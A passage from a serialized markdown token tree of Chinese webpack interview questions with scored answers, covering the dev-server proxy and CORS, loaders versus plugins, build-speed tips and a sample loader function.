\\n**注意：服务器与服务器之间请求数据并不会存在跨域行为，跨域行为是浏览器安全策略限制。**","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 在开发阶段，webpack-dev-server 会启动一个本地开发服务器，所以我们的应用在开发阶段是独立运行在 localhost 的一个端口上，而后端服务又是运行在另外一个地址上所以在开发阶段中，由于浏览器同源策略的原因，当本地访问后端就会出现跨域请求的问题通过设置 webpack proxy 实现代理请求后，相当于浏览器与服务端中添加一个代理者当本地发送请求的时候，\\n代理服务器响应该请求，并将请求转发到目标服务器，目标服务器响应数据后再将数据返回给代理服务器，最终再由代理服务器将数据响应给本地。  \\n在代理服务器传递数据给本地浏览器的过程中，两者同源，并不存在跨域行为，这时候浏览器就能正常接收数据。  \\n**注意：服务器与服务器之间请求数据并不会存在跨域行为，跨域行为是浏览器安全策略限制。**","task":false,"loose":false,"text":"**2：** 在开发阶段，webpack-dev-server 会启动一个本地开发服务器，所以我们的应用在开发阶段是独立运行在 localhost 的一个端口上，而后端服务又是运行在另外一个地址上所以在开发阶段中，由于浏览器同源策略的原因，当本地访问后端就会出现跨域请求的问题通过设置 webpack proxy 实现代理请求后，相当于浏览器与服务端中添加一个代理者当本地发送请求的时候，\\n代理服务器响应该请求，并将请求转发到目标服务器，目标服务器响应数据后再将数据返回给代理服务器，最终再由代理服务器将数据响应给本地。  \\n在代理服务器传递数据给本地浏览器的过程中，两者同源，并不存在跨域行为，这时候浏览器就能正常接收数据。  \\n**注意：服务器与服务器之间请求数据并不会存在跨域行为，跨域行为是浏览器安全策略限制。**","tokens":[{"type":"text","raw":"**2：** 在开发阶段，webpack-dev-server 会启动一个本地开发服务器，所以我们的应用在开发阶段是独立运行在 localhost 的一个端口上，而后端服务又是运行在另外一个地址上所以在开发阶段中，由于浏览器同源策略的原因，当本地访问后端就会出现跨域请求的问题通过设置 webpack proxy 实现代理请求后，相当于浏览器与服务端中添加一个代理者当本地发送请求的时候，\\n\\n代理服务器响应该请求，并将请求转发到目标服务器，目标服务器响应数据后再将数据返回给代理服务器，最终再由代理服务器将数据响应给本地。  \\n\\n在代理服务器传递数据给本地浏览器的过程中，两者同源，并不存在跨域行为，这时候浏览器就能正常接收数据。  \\n\\n**注意：服务器与服务器之间请求数据并不会存在跨域行为，跨域行为是浏览器安全策略限制。**","text":"**2：** 在开发阶段，webpack-dev-server 会启动一个本地开发服务器，所以我们的应用在开发阶段是独立运行在 localhost 的一个端口上，而后端服务又是运行在另外一个地址上所以在开发阶段中，由于浏览器同源策略的原因，当本地访问后端就会出现跨域请求的问题通过设置 webpack proxy 实现代理请求后，相当于浏览器与服务端中添加一个代理者当本地发送请求的时候，\\n代理服务器响应该请求，并将请求转发到目标服务器，目标服务器响应数据后再将数据返回给代理服务器，最终再由代理服务器将数据响应给本地。  \\n在代理服务器传递数据给本地浏览器的过程中，两者同源，并不存在跨域行为，这时候浏览器就能正常接收数据。  \\n**注意：服务器与服务器之间请求数据并不会存在跨域行为，跨域行为是浏览器安全策略限制。**","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 在开发阶段，webpack-dev-server 会启动一个本地开发服务器，所以我们的应用在开发阶段是独立运行在 localhost 的一个端口上，而后端服务又是运行在另外一个地址上所以在开发阶段中，由于浏览器同源策略的原因，当本地访问后端就会出现跨域请求的问题通过设置 webpack proxy 实现代理请求后，相当于浏览器与服务端中添加一个代理者当本地发送请求的时候，\\n代理服务器响应该请求，并将请求转发到目标服务器，目标服务器响应数据后再将数据返回给代理服务器，最终再由代理服务器将数据响应给本地。","text":" 在开发阶段，webpack-dev-server 会启动一个本地开发服务器，所以我们的应用在开发阶段是独立运行在 localhost 的一个端口上，而后端服务又是运行在另外一个地址上所以在开发阶段中，由于浏览器同源策略的原因，当本地访问后端就会出现跨域请求的问题通过设置 webpack proxy 实现代理请求后，相当于浏览器与服务端中添加一个代理者当本地发送请求的时候，\\n代理服务器响应该请求，并将请求转发到目标服务器，目标服务器响应数据后再将数据返回给代理服务器，最终再由代理服务器将数据响应给本地。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"在代理服务器传递数据给本地浏览器的过程中，两者同源，并不存在跨域行为，这时候浏览器就能正常接收数据。","text":"在代理服务器传递数据给本地浏览器的过程中，两者同源，并不存在跨域行为，这时候浏览器就能正常接收数据。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"strong","raw":"**注意：服务器与服务器之间请求数据并不会存在跨域行为，跨域行为是浏览器安全策略限制。**","text":"注意：服务器与服务器之间请求数据并不会存在跨域行为，跨域行为是浏览器安全策略限制。","tokens":[{"type":"text","raw":"注意：服务器与服务器之间请求数据并不会存在跨域行为，跨域行为是浏览器安全策略限制。","text":"注意：服务器与服务器之间请求数据并不会存在跨域行为，跨域行为是浏览器安全策略限制。","escaped":false}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## webpack的loader是什么？为什么使用它？它有哪几种配置方式\\n\\n","depth":2,"text":"webpack的loader是什么？为什么使用它？它有哪几种配置方式","tokens":[{"type":"text","raw":"webpack的loader是什么？为什么使用它？它有哪几种配置方式","text":"webpack的loader是什么？为什么使用它？它有哪几种配置方式","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：** loader 用于对模块的\\"源代码\\"进行转换，在 import 或\\"加载\\"模块时预处理文件\\n- **1：** webpack 做的事情，仅仅是分析出各种模块的依赖关系，然后形成资源列表，最终打包生成到指定的文件中。  \\n在 webpack 内部中，任何文件都是模块，不仅仅只是js 文件。默认情况下，在遇到 import 或者 require 加载模块的时候，webpack 只支持对 js 和 json文件打包，像 css、 sass、 png 等这些类型的文件的时候，webpack 则无能为力，这时候就需要配置对应的 loader 进行文件内容的解析。\\n- **3：** 关于配置 loader 的方式有三种:\\n  >配置方式(推荐)：在 webpack.config.js文件中指定 loader  \\n  >内联方式：在每个 import 语句中显式指定 loader  \\n  >Cl 方式：在 shell 命令中指定它们","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** loader 用于对模块的\\"源代码\\"进行转换，在 import 或\\"加载\\"模块时预处理文件\\n","task":false,"loose":false,"text":"**1：** loader 用于对模块的\\"源代码\\"进行转换，在 import 或\\"加载\\"模块时预处理文件","tokens":[{"type":"text","raw":"**1：** loader 用于对模块的\\"源代码\\"进行转换，在 import 或\\"加载\\"模块时预处理文件","text":"**1：** loader 用于对模块的\\"源代码\\"进行转换，在 import 或\\"加载\\"模块时预处理文件","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" loader 用于对模块的\\"源代码\\"进行转换，在 import 或\\"加载\\"模块时预处理文件","text":" loader 用于对模块的\\"源代码\\"进行转换，在 import 或\\"加载\\"模块时预处理文件","escaped":false}]}]},{"type":"list_item","raw":"- **1：** webpack 做的事情，仅仅是分析出各种模块的依赖关系，然后形成资源列表，最终打包生成到指定的文件中。  \\n在 webpack 内部中，任何文件都是模块，不仅仅只是js 文件。默认情况下，在遇到 import 或者 require 加载模块的时候，webpack 只支持对 js 和 json文件打包，像 css、 sass、 png 等这些类型的文件的时候，webpack 则无能为力，这时候就需要配置对应的 loader 进行文件内容的解析。\\n","task":false,"loose":false,"text":"**1：** webpack 做的事情，仅仅是分析出各种模块的依赖关系，然后形成资源列表，最终打包生成到指定的文件中。  \\n在 webpack 内部中，任何文件都是模块，不仅仅只是js 文件。默认情况下，在遇到 import 或者 require 加载模块的时候，webpack 只支持对 js 和 json文件打包，像 css、 sass、 png 等这些类型的文件的时候，webpack 则无能为力，这时候就需要配置对应的 loader 进行文件内容的解析。","tokens":[{"type":"text","raw":"**1：** webpack 做的事情，仅仅是分析出各种模块的依赖关系，然后形成资源列表，最终打包生成到指定的文件中。  \\n\\n在 webpack 内部中，任何文件都是模块，不仅仅只是js 文件。默认情况下，在遇到 import 或者 require 加载模块的时候，webpack 只支持对 js 和 json文件打包，像 css、 sass、 png 等这些类型的文件的时候，webpack 则无能为力，这时候就需要配置对应的 loader 进行文件内容的解析。","text":"**1：** webpack 做的事情，仅仅是分析出各种模块的依赖关系，然后形成资源列表，最终打包生成到指定的文件中。  \\n在 webpack 内部中，任何文件都是模块，不仅仅只是js 文件。默认情况下，在遇到 import 或者 require 加载模块的时候，webpack 只支持对 js 和 json文件打包，像 css、 sass、 png 等这些类型的文件的时候，webpack 则无能为力，这时候就需要配置对应的 loader 进行文件内容的解析。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" webpack 做的事情，仅仅是分析出各种模块的依赖关系，然后形成资源列表，最终打包生成到指定的文件中。","text":" webpack 做的事情，仅仅是分析出各种模块的依赖关系，然后形成资源列表，最终打包生成到指定的文件中。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"在 webpack 内部中，任何文件都是模块，不仅仅只是js 文件。默认情况下，在遇到 import 或者 require 加载模块的时候，webpack 只支持对 js 和 json文件打包，像 css、 sass、 png 等这些类型的文件的时候，webpack 则无能为力，这时候就需要配置对应的 loader 进行文件内容的解析。","text":"在 webpack 内部中，任何文件都是模块，不仅仅只是js 文件。默认情况下，在遇到 import 或者 require 加载模块的时候，webpack 只支持对 js 和 json文件打包，像 css、 sass、 png 等这些类型的文件的时候，webpack 则无能为力，这时候就需要配置对应的 loader 进行文件内容的解析。","escaped":false}]}]},{"type":"list_item","raw":"- **3：** 关于配置 loader 的方式有三种:\\n  >配置方式(推荐)：在 webpack.config.js文件中指定 loader  \\n  >内联方式：在每个 import 语句中显式指定 loader  \\n  >Cl 方式：在 shell 命令中指定它们","task":false,"loose":false,"text":"**3：** 关于配置 loader 的方式有三种:\\n>配置方式(推荐)：在 webpack.config.js文件中指定 loader  \\n>内联方式：在每个 import 语句中显式指定 loader  \\n>Cl 方式：在 shell 命令中指定它们","tokens":[{"type":"text","raw":"**3：** 关于配置 loader 的方式有三种:\\n","text":"**3：** 关于配置 loader 的方式有三种:","tokens":[{"type":"strong","raw":"**3：**","text":"3：","tokens":[{"type":"text","raw":"3：","text":"3：","escaped":false}]},{"type":"text","raw":" 关于配置 loader 的方式有三种:","text":" 关于配置 loader 的方式有三种:","escaped":false}]},{"type":"blockquote","raw":">配置方式(推荐)：在 webpack.config.js文件中指定 loader  \\n>内联方式：在每个 import 语句中显式指定 loader  \\n>Cl 方式：在 shell 命令中指定它们","tokens":[{"type":"paragraph","raw":"配置方式(推荐)：在 webpack.config.js文件中指定 loader  \\n内联方式：在每个 import 语句中显式指定 loader  \\nCl 方式：在 shell 命令中指定它们","text":"配置方式(推荐)：在 webpack.config.js文件中指定 loader  \\n内联方式：在每个 import 语句中显式指定 loader  \\nCl 方式：在 shell 命令中指定它们","tokens":[{"type":"text","raw":"配置方式(推荐)：在 webpack.config.js文件中指定 loader","text":"配置方式(推荐)：在 webpack.config.js文件中指定 loader","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"内联方式：在每个 import 语句中显式指定 loader","text":"内联方式：在每个 import 语句中显式指定 loader","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"Cl 方式：在 shell 命令中指定它们","text":"Cl 方式：在 shell 命令中指定它们","escaped":false}]}],"text":"配置方式(推荐)：在 webpack.config.js文件中指定 loader  \\n内联方式：在每个 import 语句中显式指定 loader  \\nCl 方式：在 shell 命令中指定它们"}]}]},{"type":"space","raw":"  \\n\\n"},{"type":"heading","raw":"## webpack的Plugin是什么\\n\\n","depth":2,"text":"webpack的Plugin是什么","tokens":[{"type":"text","raw":"webpack的Plugin是什么","text":"webpack的Plugin是什么","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** webpack 中的 plugin 赋予其各种灵活的功能，例如打包优化、资源管理、环境变量注入等，它们会运行在 webpack 的不同阶段(钩子/生命周期)，贯穿了 webpack 整个编译周期，目的在于解决 loader 无法实现的其他事","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** webpack 中的 plugin 赋予其各种灵活的功能，例如打包优化、资源管理、环境变量注入等，它们会运行在 webpack 的不同阶段(钩子/生命周期)，贯穿了 webpack 整个编译周期，目的在于解决 loader 无法实现的其他事","task":false,"loose":false,"text":"**2：** webpack 中的 plugin 赋予其各种灵活的功能，例如打包优化、资源管理、环境变量注入等，它们会运行在 webpack 的不同阶段(钩子/生命周期)，贯穿了 webpack 整个编译周期，目的在于解决 loader 无法实现的其他事","tokens":[{"type":"text","raw":"**2：** webpack 中的 plugin 赋予其各种灵活的功能，例如打包优化、资源管理、环境变量注入等，它们会运行在 webpack 的不同阶段(钩子/生命周期)，贯穿了 webpack 整个编译周期，目的在于解决 loader 无法实现的其他事","text":"**2：** webpack 中的 plugin 赋予其各种灵活的功能，例如打包优化、资源管理、环境变量注入等，它们会运行在 webpack 的不同阶段(钩子/生命周期)，贯穿了 webpack 整个编译周期，目的在于解决 loader 无法实现的其他事","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" webpack 中的 plugin 赋予其各种灵活的功能，例如打包优化、资源管理、环境变量注入等，它们会运行在 webpack 的不同阶段(钩子/生命周期)，贯穿了 webpack 整个编译周期，目的在于解决 loader 无法实现的其他事","text":" webpack 中的 plugin 赋予其各种灵活的功能，例如打包优化、资源管理、环境变量注入等，它们会运行在 webpack 的不同阶段(钩子/生命周期)，贯穿了 webpack 整个编译周期，目的在于解决 loader 无法实现的其他事","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## webpack的Plugin和Loader的区别\\n\\n","depth":2,"text":"webpack的Plugin和Loader的区别","tokens":[{"type":"text","raw":"webpack的Plugin和Loader的区别","text":"webpack的Plugin和Loader的区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：**【Loader】：用于对模块源码的转换， loader可以将文件从不同的语言（如TypeScript）转换为JavaScript，或者将内联图像转换为data URL。比如说：CSS-Loader，Style-Loader等。\\n- **1：**【Plugin】：目的在于解决loader无法实现的其他事，从打包优化和压缩，到重新定义环境变量，功能强大到可以用来处理各种各样的任务。webpack提供了很多开箱即用的插件：CommonChunkPlugin主要用于提取第三方库和公共模块，避免首屏加载的bundle文件，或者按需加载的bundle文件体积过大，导致加载时间过长，是一把优化的利器。而在多页面应用中，更是能够为每个页面间的应用程序共享代码创建bundle。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：**【Loader】：用于对模块源码的转换， loader可以将文件从不同的语言（如TypeScript）转换为JavaScript，或者将内联图像转换为data URL。比如说：CSS-Loader，Style-Loader等。\\n","task":false,"loose":false,"text":"**1：**【Loader】：用于对模块源码的转换， loader可以将文件从不同的语言（如TypeScript）转换为JavaScript，或者将内联图像转换为data URL。比如说：CSS-Loader，Style-Loader等。","tokens":[{"type":"text","raw":"**1：**【Loader】：用于对模块源码的转换， loader可以将文件从不同的语言（如TypeScript）转换为JavaScript，或者将内联图像转换为data URL。比如说：CSS-Loader，Style-Loader等。","text":"**1：**【Loader】：用于对模块源码的转换， loader可以将文件从不同的语言（如TypeScript）转换为JavaScript，或者将内联图像转换为data URL。比如说：CSS-Loader，Style-Loader等。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"【Loader】：用于对模块源码的转换， loader可以将文件从不同的语言（如TypeScript）转换为JavaScript，或者将内联图像转换为data URL。比如说：CSS-Loader，Style-Loader等。","text":"【Loader】：用于对模块源码的转换， loader可以将文件从不同的语言（如TypeScript）转换为JavaScript，或者将内联图像转换为data URL。比如说：CSS-Loader，Style-Loader等。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**【Plugin】：目的在于解决loader无法实现的其他事，从打包优化和压缩，到重新定义环境变量，功能强大到可以用来处理各种各样的任务。webpack提供了很多开箱即用的插件：CommonChunkPlugin主要用于提取第三方库和公共模块，避免首屏加载的bundle文件，或者按需加载的bundle文件体积过大，导致加载时间过长，是一把优化的利器。而在多页面应用中，更是能够为每个页面间的应用程序共享代码创建bundle。","task":false,"loose":false,"text":"**1：**【Plugin】：目的在于解决loader无法实现的其他事，从打包优化和压缩，到重新定义环境变量，功能强大到可以用来处理各种各样的任务。webpack提供了很多开箱即用的插件：CommonChunkPlugin主要用于提取第三方库和公共模块，避免首屏加载的bundle文件，或者按需加载的bundle文件体积过大，导致加载时间过长，是一把优化的利器。而在多页面应用中，更是能够为每个页面间的应用程序共享代码创建bundle。","tokens":[{"type":"text","raw":"**1：**【Plugin】：目的在于解决loader无法实现的其他事，从打包优化和压缩，到重新定义环境变量，功能强大到可以用来处理各种各样的任务。webpack提供了很多开箱即用的插件：CommonChunkPlugin主要用于提取第三方库和公共模块，避免首屏加载的bundle文件，或者按需加载的bundle文件体积过大，导致加载时间过长，是一把优化的利器。而在多页面应用中，更是能够为每个页面间的应用程序共享代码创建bundle。","text":"**1：**【Plugin】：目的在于解决loader无法实现的其他事，从打包优化和压缩，到重新定义环境变量，功能强大到可以用来处理各种各样的任务。webpack提供了很多开箱即用的插件：CommonChunkPlugin主要用于提取第三方库和公共模块，避免首屏加载的bundle文件，或者按需加载的bundle文件体积过大，导致加载时间过长，是一把优化的利器。而在多页面应用中，更是能够为每个页面间的应用程序共享代码创建bundle。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"【Plugin】：目的在于解决loader无法实现的其他事，从打包优化和压缩，到重新定义环境变量，功能强大到可以用来处理各种各样的任务。webpack提供了很多开箱即用的插件：CommonChunkPlugin主要用于提取第三方库和公共模块，避免首屏加载的bundle文件，或者按需加载的bundle文件体积过大，导致加载时间过长，是一把优化的利器。而在多页面应用中，更是能够为每个页面间的应用程序共享代码创建bundle。","text":"【Plugin】：目的在于解决loader无法实现的其他事，从打包优化和压缩，到重新定义环境变量，功能强大到可以用来处理各种各样的任务。webpack提供了很多开箱即用的插件：CommonChunkPlugin主要用于提取第三方库和公共模块，避免首屏加载的bundle文件，或者按需加载的bundle文件体积过大，导致加载时间过长，是一把优化的利器。而在多页面应用中，更是能够为每个页面间的应用程序共享代码创建bundle。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## webpack常见的提升构建速度的方法\\n\\n","depth":2,"text":"webpack常见的提升构建速度的方法","tokens":[{"type":"text","raw":"webpack常见的提升构建速度的方法","text":"webpack常见的提升构建速度的方法","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** 常见的有一下几种：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 常见的有一下几种：","task":false,"loose":false,"text":"**2：** 常见的有一下几种：","tokens":[{"type":"text","raw":"**2：** 常见的有一下几种：","text":"**2：** 常见的有一下几种：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 常见的有一下几种：","text":" 常见的有一下几种：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"blockquote","raw":" >优化 loader 配置  \\n >合理使用 resolve.extensions  \\n >优化 resolve.modules  \\n >优化 resolve.alias  \\n >使用 DLLPlugin 插件  \\n >使用 cache-loader  \\n >terser 启动多线程  \\n >合理使用 sourceMap","tokens":[{"type":"paragraph","raw":"优化 loader 配置  \\n合理使用 resolve.extensions  \\n优化 resolve.modules  \\n优化 resolve.alias  \\n使用 DLLPlugin 插件  \\n使用 cache-loader  \\nterser 启动多线程  \\n合理使用 sourceMap","text":"优化 loader 配置  \\n合理使用 resolve.extensions  \\n优化 resolve.modules  \\n优化 resolve.alias  \\n使用 DLLPlugin 插件  \\n使用 cache-loader  \\nterser 启动多线程  \\n合理使用 sourceMap","tokens":[{"type":"text","raw":"优化 loader 配置","text":"优化 loader 配置","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"合理使用 resolve.extensions","text":"合理使用 resolve.extensions","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"优化 resolve.modules","text":"优化 resolve.modules","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"优化 resolve.alias","text":"优化 resolve.alias","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"使用 DLLPlugin 插件","text":"使用 DLLPlugin 插件","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"使用 cache-loader","text":"使用 cache-loader","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"terser 启动多线程","text":"terser 启动多线程","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"合理使用 sourceMap","text":"合理使用 sourceMap","escaped":false}]}],"text":"优化 loader 配置  \\n合理使用 resolve.extensions  \\n优化 resolve.modules  \\n优化 resolve.alias  \\n使用 DLLPlugin 插件  \\n使用 cache-loader  \\nterser 启动多线程  \\n合理使用 sourceMap"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## webpack中的Loader如何编写？\\n\\n","depth":2,"text":"webpack中的Loader如何编写？","tokens":[{"type":"text","raw":"webpack中的Loader如何编写？","text":"webpack中的Loader如何编写？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **5：** loader 的本质其本质为函数，函数中的 this 作为上下文会被 webpack 填充，因此我们不能将 loader 设为一个箭头函数。\\n函数接受一个参数，为 webpack 传递给 loader 的文件源内容函数中 this 是由 webpack 提供的对象，能够获取当前 loader 所需要的各种信息函数中有异步操作或同步操作，异步操作通过 this.callback 返回，返回值要求为 string 或者 Buffer。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **5：** loader 的本质其本质为函数，函数中的 this 作为上下文会被 webpack 填充，因此我们不能将 loader 设为一个箭头函数。\\n函数接受一个参数，为 webpack 传递给 loader 的文件源内容函数中 this 是由 webpack 提供的对象，能够获取当前 loader 所需要的各种信息函数中有异步操作或同步操作，异步操作通过 this.callback 返回，返回值要求为 string 或者 Buffer。","task":false,"loose":false,"text":"**5：** loader 的本质其本质为函数，函数中的 this 作为上下文会被 webpack 填充，因此我们不能将 loader 设为一个箭头函数。\\n函数接受一个参数，为 webpack 传递给 loader 的文件源内容函数中 this 是由 webpack 提供的对象，能够获取当前 loader 所需要的各种信息函数中有异步操作或同步操作，异步操作通过 this.callback 返回，返回值要求为 string 或者 Buffer。","tokens":[{"type":"text","raw":"**5：** loader 的本质其本质为函数，函数中的 this 作为上下文会被 webpack 填充，因此我们不能将 loader 设为一个箭头函数。\\n\\n函数接受一个参数，为 webpack 传递给 loader 的文件源内容函数中 this 是由 webpack 提供的对象，能够获取当前 loader 所需要的各种信息函数中有异步操作或同步操作，异步操作通过 this.callback 返回，返回值要求为 string 或者 Buffer。","text":"**5：** loader 的本质其本质为函数，函数中的 this 作为上下文会被 webpack 填充，因此我们不能将 loader 设为一个箭头函数。\\n函数接受一个参数，为 webpack 传递给 loader 的文件源内容函数中 this 是由 webpack 提供的对象，能够获取当前 loader 所需要的各种信息函数中有异步操作或同步操作，异步操作通过 this.callback 返回，返回值要求为 string 或者 Buffer。","tokens":[{"type":"strong","raw":"**5：**","text":"5：","tokens":[{"type":"text","raw":"5：","text":"5：","escaped":false}]},{"type":"text","raw":" loader 的本质其本质为函数，函数中的 this 作为上下文会被 webpack 填充，因此我们不能将 loader 设为一个箭头函数。\\n函数接受一个参数，为 webpack 传递给 loader 的文件源内容函数中 this 是由 webpack 提供的对象，能够获取当前 loader 所需要的各种信息函数中有异步操作或同步操作，异步操作通过 this.callback 返回，返回值要求为 string 或者 Buffer。","text":" loader 的本质其本质为函数，函数中的 this 作为上下文会被 webpack 填充，因此我们不能将 loader 设为一个箭头函数。\\n函数接受一个参数，为 webpack 传递给 loader 的文件源内容函数中 this 是由 webpack 提供的对象，能够获取当前 loader 所需要的各种信息函数中有异步操作或同步操作，异步操作通过 this.callback 返回，返回值要求为 string 或者 Buffer。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```javascript\\n//导出一个函数，source为webpack传递给loader的文件源内容\\nmodule.exports = function(source){\\n const content = doSomeThing2JsString(source);\\n//如果 loader 配置了 options 对象，那么this.query将指向 options\\nconst options = this.query;\\n// 可以用作解析其他模块路径的上下文\\nconsole.log(\'this.context\');\\n/*\\n* this.callback 参数:\\n* error:Error |null，当 loader 出错时向外抛出一个 error\\n* content:String | Buffer，经过 loader 编译后需要导出的内容\\n* sourceMap:为方便调试生成的编译后内容的 source map* ast:本次编译生成的 AST 静态语法树，之后执行的 loader 可以直接使用这个 AST.进而省去重复生成 AST 的过程\\n*/\\nthis.callback(null，content);//异步\\nreturn content;//同步\\n}\\n```","lang":"javascript","text":"//导出一个函数，source为webpack传递给loader的文件源内容\\nmodule.exports = function(source){\\n const content = doSomeThing2JsString(source);\\n//如果 loader 配置了 options 对象，那么this.query将指向 options\\nconst options = this.query;\\n// 可以用作解析其他模块路径的上下文\\nconsole.log(\'this.context\');\\n/*\\n* this.callback 参数:\\n* error:Error |null，当 